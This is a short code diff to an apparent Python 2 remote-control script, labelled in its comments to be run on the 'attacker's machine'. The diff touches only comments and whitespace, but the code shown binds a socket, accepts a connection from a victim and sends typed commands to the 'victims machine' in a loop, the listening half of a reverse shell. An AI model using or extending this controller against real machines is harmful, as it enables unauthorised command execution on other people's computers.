@@ -1,5 +1,6 @@
 #/usr/bin/env python
-# run this file on attacke's machine
+### Use python 2.7
+### run this file on attacke's machine
 import attacker_info, socket
 
 attacker_ip = ""                                         # keep this empty
@@ -11,7 +12,7 @@ s.listen(5)                                              # listen at most 5 conn
 (conn, addr) = s.accept()
 
 while True:
-    command = raw_input(">")                             # send command to victims machine 
+    command = raw_input(">")                             # send command to victims machine
     conn.send(command)
     if (command == "exit"):
         break
